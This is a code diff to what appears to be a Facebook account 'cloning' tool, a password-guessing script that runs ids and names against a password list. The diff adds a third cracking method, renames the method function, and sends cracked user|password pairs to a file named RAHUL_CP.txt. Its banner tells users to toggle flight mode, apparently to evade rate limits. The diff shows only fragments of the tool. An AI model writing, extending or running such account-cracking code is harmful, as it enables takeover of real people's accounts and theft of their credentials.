@@ -54,7 +54,7 @@ logo = ("""\033[1;32m
  Facebook  : RB RAHUL CMD(RB Brand)
  Status    : Free
  Tool Type : File Cloning
- Version   : 5.5.5
+ Version   : 5.4.5
 ----------------------------------------------
  Note: Use Fligt Mode ON/OFf When Start CMD 
 \033[1;37m----------------------------------------------""")
@@ -203,6 +203,8 @@ def menu():
                                                         crack_submit.submit(ffb,ids,names,passlist)
                                                 elif mthd in ['2','02']:
                                                         crack_submit.submit(api,ids,names,passlist)
+                                                elif mthd in ['3','03']:
+                                                        crack_submit.submit(method1,ids,names,passlist)
                                                 else:
                                                         crack_submit.submit(__metode__,ids,names,passlist)
                                 print('\033[1;37m')
@@ -627,7 +629,7 @@ def apix(ids,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass      
-def __metode__(self, user, __chi__, cebok):
+def method1(self, user, __chi__, cebok):
         global ok,cp,loop
         sys.stdout.write(f"\r \x1b[1;97m[RAHUL] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
@@ -694,7 +696,7 @@ def __metode__(self, user, __chi__, cebok):
                         print('\r%s [RAHUL-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('FILE_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('RAHUL_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -705,13 +707,13 @@ def __metode__(self, user, __chi__, cebok):
                     print('\r%s [RAHUL-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('FILE_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('RAHUL_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
             loop+=1
         except:
-            self.__metode__(user, pw, cebok)                        
+            self.method1(user, pw, cebok)                        
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
@@ -863,5 +865,4 @@ except requests.exceptions.ConnectionError:
         exit()
 except Exception as e:pass
 menu()
-
 
